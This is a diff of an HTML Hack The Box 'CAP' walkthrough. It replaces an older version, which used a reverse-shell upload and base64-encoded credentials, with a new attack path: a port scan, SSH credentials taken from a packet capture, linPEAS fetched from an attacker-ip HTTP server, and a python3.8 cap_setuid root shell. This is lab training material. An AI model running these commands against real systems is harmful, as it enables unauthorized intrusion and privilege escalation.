@@ -1,130 +1,224 @@
-<!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>HTB - CAP Lab Walkthrough</title>
-  <style>
-    body {
-      background-color: #0c0c0c;
-      color: #d0d0d0;
-      font-family: 'Courier New', Courier, monospace;
-      margin: 40px;
-    }
+  <head>
+    <meta charset="UTF-8" />
+    <title>HTB - CAP Lab Walkthrough</title>
+    <style>
+      body {
+        background-color: #0c0c0c;
+        color: #d0d0d0;
+        font-family: "Courier New", Courier, monospace;
+        margin: 40px;
+      }
 
-    h1, h2 {
-      color: #009e66;
-      text-shadow: 0 0 8px #004d33;
-    }
+      h1,
+      h2 {
+        color: #009e66;
+        text-shadow: 0 0 8px #004d33;
+      }
 
-    a {
-      color: #3399cc;
-      text-decoration: none;
-    }
+      a {
+        color: #3399cc;
+        text-decoration: none;
+      }
 
-    a:hover {
-      color: #00ccff;
-      text-shadow: 0 0 6px #00ccff;
-    }
+      a:hover {
+        color: #00ccff;
+        text-shadow: 0 0 6px #00ccff;
+      }
 
-    code, pre, blockquote {
-      background-color: #111;
-      padding: 10px;
-      border-radius: 6px;
-      display: block;
-      color: #ccc;
-      overflow-x: auto;
-    }
+      code,
+      pre,
+      blockquote {
+        background-color: #111;
+        padding: 10px;
+        border-radius: 6px;
+        display: block;
+        color: #ccc;
+        overflow-x: auto;
+      }
 
-    ul {
-      list-style: square;
-      padding-left: 20px;
-    }
+      ul {
+        list-style: square;
+        padding-left: 20px;
+      }
 
-    em {
-      color: #aaa;
-    }
+      li {
+        margin-top: 15;
+      }
 
-    hr {
-      border: none;
-      height: 1px;
-      background-color: #333;
-      margin: 20px 0;
-    }
+      em {
+        color: #aaa;
+      }
 
-    .section {
-      margin-bottom: 40px;
-    }
+      hr {
+        border: none;
+        height: 1px;
+        background-color: #333;
+        margin: 20px 0;
+      }
 
-    .flag {
-      background-color: #222;
-      border: 1px dashed #009e66;
-      padding: 10px;
-      margin-top: 10px;
-      font-weight: bold;
-    }
-  </style>
-</head>
-<body>
+      .section {
+        margin-bottom: 40px;
+      }
 
-  <h1>HTB Lab: CAP 🛡️</h1>
-  <p>A full walkthrough covering <strong>Enumeration</strong>, <strong>Foothold</strong>, and <strong>Privilege Escalation</strong>.</p>
+      .flag {
+        background-color: #222;
+        border: 1px dashed #009e66;
+        padding: 10px;
+        margin-top: 10px;
+        font-weight: bold;
+      }
 
-  <div class="section">
-    <h2>1️⃣ Enumeration</h2>
-    <ul>
-      <li>Run <code>nmap -sC -sV -oA cap_scan 10.10.10.245</code></li>
-      <li>Discovered open ports:
-        <ul>
-          <li>TCP/80 – Apache server hosting a web interface</li>
-          <li>TCP/21 – FTP with anonymous login enabled</li>
-        </ul>
-      </li>
-      <li>Web interface at <code>http://10.10.10.245/</code> is a packet capture portal</li>
-      <li>FTP allows downloading <code>.pcap</code> files — these contain credentials!</li>
-    </ul>
-  </div>
+      .back-button {
+        position: fixed;
+        background-color: #009e66;
+        color: #fff;
+        padding: 10px 16px;
+        border-radius: 6px;
+        text-decoration: none;
+        font-weight: bold;
+        box-shadow: 0 0 10px #004d33;
+        transition: background-color 0.3s;
+        z-index: 1000;
+      }
 
-  <div class="section">
-    <h2>2️⃣ Foothold</h2>
-    <ul>
-      <li>Analyze the downloaded <code>.pcap</code> using Wireshark or <code>tcpdump</code></li>
-      <li>Extract HTTP Basic Auth from stream:
-        <pre>GET /login.php HTTP/1.1
-Authorization: Basic YWRtaW46Y2FwY2FwY2Fw</pre>
-      </li>
-      <li>Decode base64:
-        <pre>echo YWRtaW46Y2FwY2FwY2Fw | base64 -d</pre>
-        <ul>
-          <li><strong>Username:</strong> admin</li>
-          <li><strong>Password:</strong> capcapcap</li>
-        </ul>
-      </li>
-      <li>Login via web portal and upload a reverse shell payload</li>
-      <li>Catch shell with <code>nc -lvnp 4444</code></li>
-    </ul>
-  </div>
+      .back-button:hover {
+        background-color: #00cc99;
+      }
 
-  <div class="section">
-    <h2>3️⃣ Privilege Escalation</h2>
-    <ul>
-      <li>Check sudo rights: <code>sudo -l</code></li>
-      <li>Allowed to run <code>/usr/bin/capctl</code> with sudo</li>
-      <li>Analyze binary with <code>strings</code>, <code>ltrace</code>, <code>gdb</code></li>
-      <li>Find command injection vulnerability</li>
-      <li>Exploit using:
-        <pre>sudo /usr/bin/capctl "&& /bin/bash"</pre>
-      </li>
-      <li>You’re root 🧨</li>
-    </ul>
-    <div class="flag">
-      Root Flag: <code>cat /root/root.txt</code>
+      .back-top {
+        top: 20px;
+        right: 20px;
+      }
+
+    </style>
+  </head>
+  <body>
+    <h1>HTB Lab: CAP 🛡️</h1>
+    <p>
+      A full walkthrough covering <strong>Enumeration</strong>,
+      <strong>Foothold</strong>, and <strong>Privilege Escalation</strong>.
+    </p>
+
+    <a href="https://hx3r.github.io/CheatBook/" class="back-button back-top">⬅️ Back to CheatBook</a>
+    
+    <div class="section">
+      <h2>1️⃣ Enumeration</h2>
+      <ul>
+        <li>
+          <p>Portscan</p>
+          <code>nmap 10.10.10.245 -oA cap_scan</code>
+          <p>Result</p>
+          <code>
+            Nmap scan report for 10.10.10.245 Host is up (0.68s latency).
+            <br />Not shown: 997 closed tcp ports (conn-refused) <br />PORT
+            STATE SERVICE <br />21/tcp open ftp <br />22/tcp open ssh
+            <br />80/tcp open http
+          </code>
+        </li>
+        <li>
+          <p>21 FTP</p>
+          Anonymous login is disabled
+        </li>
+        <li>
+          <p>22 SSH</p>
+          Nothing compelling here yet.
+        </li>
+        <li>
+          <p>80 http</p>
+          Web interface at
+          <a href="http://10.10.10.245/">http://10.10.10.245/</a> is a packet
+          capture portal. <br /><br />
+          - Username: 'Nathan' <br />
+          - Multiable downloadable PCAP file under<br />
+          <a href="http://10.10.10.245/data/0">http://10.10.10.245/data/0</a>
+          [0-5 as URL parameter possible]<br />
+          accessible through Menu on the left side.
+        </li>
+      </ul>
     </div>
-  </div>
 
-  <hr>
+    <div class="section">
+      <h2>2️⃣ Foothold</h2>
+      <ul>
+        <li>Analyze the downloaded PCAP file [0.pcap] using Wireshark</li>
+        <li>
+          <p>Extract FTP Basic Auth from stream:</p>
+          <code> USER nathan PASS Buck3tH4TF0RM3!</code>
+        </li>
+        <li>Login via SSH 'nathan@10.10.10245'</li>
+        <li>You’re user 🧑‍💻</li>
+      </ul>
+      <div class="flag">
+        Get User Flag: <code>cat /home/nathan/user.txt</code>
+      </div>
+    </div>
 
-  <p><strong>HTB Profile:</strong> <a href="https://app.hackthebox.com/users/526909268411023381" target="_blank">Hx3R</a></p>
-  <p><strong>Discord:</strong> <a href="https://discord.gg/whe72edd" target="_blank">Join my server</a></p>
+    <div class="section">
+      <h2>3️⃣ Privilege Escalation</h2>
+      <ul>
+        <li>
+          <p>
+            Downloading linPEAS script on <strong>attack host</strong> and get
+            it on target
+          </p>
+          attacker:
+          <code>
+            wget
+            https://github.com/peass-ng/PEASS-ng/releases/download/20250701-bdcab634/linpeas.sh </code
+          ><br />
+          <code> python -m http.server </code><br />
+          target:
+          <code> wget http://[[attacker-ip]]:8000/linpeas.sh </code>
+        </li>
+        <li>
+          <p>Make it executable</p>
+          <code>chmod +x linpeas.sh</code>
+        </li>
+        <li>
+          <p>Run it</p>
+          <code>./linpeas.sh</code>
+        </li>
+        <li>
+          <p>Check results</p>
+          <code
+            >Files with capabilities (limited to 50):<br />
+            <strong>/usr/bin/python3.8</strong> =
+            cap_setuid,cap_net_bind_service+eip<br />
+            /usr/bin/ping = cap_net_raw+ep<br />
+            /usr/bin/traceroute6.iputils = cap_net_raw+ep<br />
+            /usr/bin/mtr-packet = cap_net_raw+ep<br />
+            /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper
+            = cap_net_bind_service,cap_net_admin+ep</code
+          >
+        </li>
+        <li>
+          <p>Get root shell with 'Python3.8'</p>
+          <code
+            >Python3.8<br />
+            import os<br />
+            os.setuid(0)<br />
+            os.system("/bin/bash")</code
+          >
+        </li>
+        <li>You’re root 🧨</li>
+      </ul>
+      <div class="flag">Root Flag: <code>cat /root/root.txt</code></div>
+    </div>
 
-</body>
+    <hr />
+
+    <p>
+      <strong>HTB Profile:</strong>
+      <a
+        href="https://app.hackthebox.com/users/526909268411023381"
+        target="_blank"
+        >Hx3R</a
+      >
+    </p>
+    <p>
+      <strong>Discord:</strong>
+      <a href="https://discord.gg/whe72edd" target="_blank">Join my server</a>
+    </p>
+  </body>
 </html>
